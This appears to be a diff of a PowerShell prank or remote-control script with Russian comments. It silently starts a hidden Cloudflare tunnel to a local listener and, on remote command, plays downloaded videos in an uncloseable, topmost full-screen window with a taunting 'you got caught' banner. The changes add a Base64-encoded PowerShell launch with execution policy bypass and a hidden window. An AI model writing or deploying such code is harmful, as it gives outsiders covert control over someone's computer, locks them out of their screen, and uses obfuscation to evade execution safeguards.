@@ -20,38 +20,35 @@ function Get-GitHubFile($path) {
     try {
         return (Invoke-WebRequest -Uri $url -UseBasicParsing -TimeoutSec 10 -ErrorAction Stop).Content
     } catch {
-        Write-Error "Ошибка скачивания с GitHub ($path): $_"
         return $null
     }
 }
 
-# Безопасное скачивание cloudflared
+# 1. Скачивание cloudflared
 if (-not (Test-Path $cfPath)) {
     $url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe"
     try {
         Invoke-WebRequest -Uri $url -OutFile $cfPath -UseBasicParsing -TimeoutSec 30 -ErrorAction Stop
     } catch {
-        Write-Error "Не удалось скачать cloudflared: $_"
+        Write-Host "Ошибка скачивания cloudflared"
     }
 }
 
-# Запуск Cloudflare Tunnel и сохранение ссылки в Загрузки
+# 2. Запуск туннеля и сохранение ссылки в Загрузки (увеличен таймаут ожидания до 60 секунд)
 if (Test-Path $cfPath) {
     $psi = New-Object System.Diagnostics.ProcessStartInfo
     $psi.FileName = $cfPath
-    $psi.Arguments = "tunnel --url http://localhost:$listenerPort --logfile $workDir\tunnel.log"
+    $psi.Arguments = "tunnel --url http://localhost:$listenerPort --logfile `"$workDir\tunnel.log`""
     $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
     $psi.CreateNoWindow = $true
     [System.Diagnostics.Process]::Start($psi) | Out-Null
 
-    # Путь к файлу со ссылкой в папке Загрузки
     $downloadsFolder = Join-Path $env:USERPROFILE "Downloads"
     $urlFile = Join-Path $downloadsFolder "tunnel_url.txt"
 
-    # Фоновый процесс, который ждет появление ссылки в логе и сохраняет её
     Start-Job -ScriptBlock {
         param($logPath, $outFile)
-        for ($i = 0; $i -lt 20; $i++) {
+        for ($i = 0; $i -lt 60; $i++) {
             Start-Sleep -Seconds 1
             if (Test-Path $logPath) {
                 $match = Select-String -Path $logPath -Pattern "https://.*\.trycloudflare\.com" | Select-Object -First 1
@@ -77,8 +74,7 @@ function Send-Response($ctx, $msg) {
 
 function Stop-All {
     if (Test-Path $flagFile) { [System.IO.File]::WriteAllText($flagFile, "0") }
-    Get-Job -Name "VideoEnforcer" -ErrorAction SilentlyContinue | Stop-Job -ErrorAction SilentlyContinue
-    Get-Job -Name "VideoEnforcer" -ErrorAction SilentlyContinue | Remove-Job -Force -ErrorAction SilentlyContinue
+    # Жёстко гасим процесс WPF-окна
     Get-Process -Name "powershell","pwsh" -ErrorAction SilentlyContinue | Where-Object { $_.MainWindowTitle -eq "WpfPlayer" } | Stop-Process -Force
     if (Test-Path "$workDir\video.mp4") { Remove-Item "$workDir\video.mp4" -Force -ErrorAction SilentlyContinue }
 }
@@ -99,7 +95,7 @@ while ($listener.IsListening) {
                     continue
                 }
 
-                $urls = $content -split "`n" | ForEach-Object { $_.Trim() } | Where-Object { $_ -ne "" }
+                $urls = $content -split "`r?`n" | ForEach-Object { $_.Trim() } | Where-Object { $_ -ne "" }
                 $played = @()
                 if (Test-Path $playedFile) { $played = Get-Content $playedFile }
                 
@@ -116,69 +112,60 @@ while ($listener.IsListening) {
                     
                     [System.IO.File]::WriteAllText($flagFile, "1")
                     
-                    Start-Job -Name "VideoEnforcer" -ScriptBlock {
-                        param($videoPath, $stopPath)
-                        
-                        $code = {
-                            param($vFile, $sFile)
-                            $ErrorActionPreference = 'SilentlyContinue'
-                            Add-Type -AssemblyName PresentationFramework, PresentationCore, WindowsBase
+                    # НАДЁЖНЫЙ ЗАПУСК ПЛЕЕРА В ОТДЕЛЬНОМ STA-ПРОЦЕССЕ
+                    $playerScript = @"
+                        Add-Type -AssemblyName PresentationFramework, PresentationCore, WindowsBase
+                        `$win = New-Object System.Windows.Window
+                        `$win.Title = 'WpfPlayer'
+                        `$win.WindowState = 'Maximized'
+                        `$win.WindowStyle = 'None'
+                        `$win.ResizeMode = 'NoResize'
+                        `$win.Topmost = `$true
+                        `$win.ShowInTaskbar = `$false
+                        `$win.Background = [System.Windows.Media.Brushes]::Black
+                        `$win.Cursor = [System.Windows.Input.Cursors]::None
 
-                            $win = New-Object System.Windows.Window
-                            $win.Title = "WpfPlayer"
-                            $win.WindowState = 'Maximized'
-                            $win.WindowStyle = 'None'
-                            $win.ResizeMode = 'NoResize'
-                            $win.Topmost = $true
-                            $win.ShowInTaskbar = $false
-                            $win.Background = [System.Windows.Media.Brushes]::Black
-                            $win.Cursor = [System.Windows.Input.Cursors]::None
+                        `$win.Add_Closing({ if (-not `$script:allowClose) { `$_.Cancel = `$true } })
 
-                            $win.Add_Closing({ if (-not $script:allowClose) { $_.Cancel = $true } })
+                        `$me = New-Object System.Windows.Controls.MediaElement
+                        `$me.Source = New-Object System.Uri('$outFile')
+                        `$me.LoadedBehavior = 'Play'
+                        `$me.Add_MediaEnded({ `$me.Position = [TimeSpan]::Zero; `$me.Play() })
 
-                            $me = New-Object System.Windows.Controls.MediaElement
-                            $me.Source = New-Object System.Uri($vFile)
-                            $me.LoadedBehavior = 'Play'
-                            $me.Add_MediaEnded({ $me.Position = [TimeSpan]::Zero; $me.Play() })
+                        `$banner = New-Object System.Windows.Controls.TextBlock
+                        `$banner.Text = 'ПОЗДРАВЛЯЮ, ТЫ ПОПАЛСЯ :D'
+                        `$banner.FontSize = 48
+                        `$banner.FontWeight = 'Bold'
+                        `$banner.Foreground = [System.Windows.Media.Brushes]::Red
+                        `$banner.HorizontalAlignment = 'Center'
+                        `$banner.VerticalAlignment = 'Bottom'
+                        `$banner.Margin = '0,0,0,80'
 
-                            $banner = New-Object System.Windows.Controls.TextBlock
-                            $banner.Text = "ПОЗДРАВЛЯЮ, ТЫ ПОПАЛСЯ :D"
-                            $banner.FontSize = 48
-                            $banner.FontWeight = 'Bold'
-                            $banner.Foreground = [System.Windows.Media.Brushes]::Red
-                            $banner.HorizontalAlignment = 'Center'
-                            $banner.VerticalAlignment = 'Bottom'
-                            $banner.Margin = '0,0,0,80'
+                        `$grid = New-Object System.Windows.Controls.Grid
+                        `$grid.Children.Add(`$me) | Out-Null
+                        `$grid.Children.Add(`$banner) | Out-Null
+                        `$win.Content = `$grid
 
-                            $grid = New-Object System.Windows.Controls.Grid
-                            $grid.Children.Add($me) | Out-Null
-                            $grid.Children.Add($banner) | Out-Null
-                            $win.Content = $grid
+                        `$timer = New-Object System.Windows.Threading.DispatcherTimer
+                        `$timer.Interval = [TimeSpan]::FromMilliseconds(400)
+                        `$timer.Add_Tick({ `$banner.Opacity = 1 - `$banner.Opacity })
+                        `$timer.Start()
 
-                            $timer = New-Object System.Windows.Threading.DispatcherTimer
-                            $timer.Interval = [TimeSpan]::FromMilliseconds(400)
-                            $timer.Add_Tick({ $banner.Opacity = 1 - $banner.Opacity })
-                            $timer.Start()
+                        `$win.Add_PreviewKeyDown({
+                            param(`$s, `$e)
+                            if (`$e.Key -eq 'Q' -and [System.Windows.Input.Keyboard]::Modifiers -band 3) {
+                                `$script:allowClose = `$true
+                                New-Item '$stopFile' -ItemType File -Force | Out-Null
+                                `$win.Close()
+                            }
+                        })
 
-                            $win.Add_PreviewKeyDown({
-                                param($s, $e)
-                                if ($e.Key -eq 'Q' -and [System.Windows.Input.Keyboard]::Modifiers -band 3) {
-                                    $script:allowClose = $true
-                                    New-Item $sFile -ItemType File -Force | Out-Null
-                                    $win.Close()
-                                }
-                            })
+                        `$app = New-Object System.Windows.Application
+                        `$app.Run(`$win)
+"@
+                    $encodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($playerScript))
+                    Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -EncodedCommand $encodedCommand" -WindowStyle Hidden
 
-                            $app = New-Object System.Windows.Application
-                            $app.Run($win)
-                        }
-
-                        $powershell = [powershell]::Create()
-                        $powershell.AddScript($code).AddArgument($videoPath).AddArgument($stopPath) | Out-Null
-                        $powershell.Runspace.ApartmentState = "STA"
-                        $powershell.Invoke()
-                    } -ArgumentList $outFile, $stopFile | Out-Null
-                    
                     Add-Content $playedFile $next
                     Send-Response $ctx "Playing in WPF full-screen: $next"
                 } else {
@@ -199,8 +186,12 @@ while ($listener.IsListening) {
         }
         "/tunnel" {
             if (Test-Path "$workDir\tunnel.log") {
-                $url = (Select-String -Path "$workDir\tunnel.log" -Pattern "https://.*\.trycloudflare\.com" | Select-Object -First 1).Matches.Value
-                Send-Response $ctx ($url -or "Tunnel logging started but URL not found yet")
+                $match = Select-String -Path "$workDir\tunnel.log" -Pattern "https://.*\.trycloudflare\.com" | Select-Object -First 1
+                if ($match) {
+                    Send-Response $ctx $match.Matches.Value
+                } else {
+                    Send-Response $ctx "Tunnel log found, waiting for URL..."
+                }
             } else {
                 Send-Response $ctx "Log file not found"
             }
